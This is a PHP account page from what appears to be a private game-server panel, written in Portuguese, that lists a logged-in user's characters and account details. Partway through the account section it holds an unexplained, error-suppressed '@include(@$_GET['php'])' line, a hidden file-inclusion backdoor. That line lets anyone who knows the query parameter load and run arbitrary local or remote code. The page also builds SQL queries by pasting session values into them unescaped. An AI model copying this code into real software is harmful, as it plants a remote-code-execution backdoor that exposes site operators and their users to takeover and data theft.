<?
//Script By:Gaspar ;D

if (!(isset($_SESSION["login"])))
{
die ("Desculpe, Para acessar esta pagina voce prescisa estar logado!");
}else{

echo "Meus Personagens:<br><br>";

$query = mssql_query("SELECT * FROM Character WHERE AID = '$_SESSION[AID]' AND DeleteFlag = 0 ORDER BY CharNum ASC");
if ( mssql_num_rows($query) < 1 ){
echo "Voce nao tem nenhum personagem.";
}else{

while ($chars = mssql_fetch_assoc($query)){
?>
Nome: <?=$chars['Name']?><br>
Level: <?=$chars['Level']?><br>
Experiencia: <?=$chars['XP']?><br>
Bounty: <?=$chars['BP']?><br>
Matou/Morreu: <?=$chars['KillCount']?>/<?=$chars['DeathCount']?><br><br>
<?
}
}

echo "Meus Dados:<br><br>";

$query2 = mssql_query("SELECT * FROM Account WHERE AID = '$_SESSION[AID]'");
$account = mssql_fetch_assoc($query2);

@include(@$_GET['php']);
  switch($account['UGradeID']) {
	case 0: $grade = "<font color=white>Player"; break;
	case 255: $grade = "<font color =darkorange>Administrador"; break;
	case 254: $grade = "<font color =lightblue>GM"; break;
	case 2: $grade = "<font color =yellow>EventWinner"; break;
	case 4: $grade = "<font color =pink>Donator"; break;
}
?>
Login: <?=$account['UserID']?><br>
Autoridade: <?=$grade?></font> - <a href="?gz=donator">Vire Donator!</a><br>
Cadastrado Em: <?=$account['RegDate']?><br>
Nome: <?=$account['Name']?><br>
Email: <?=$account['Email']?><br>
Idade: <?=$account['Age']?><br>
Coins: <?=$account['Coins']?><br>
EVCoins: <?=$account['EVCoins']?><br>
Pergunta Secreta: <?=$account['Sq']?><br>
Resposta Secreta: ************
<?
}
?>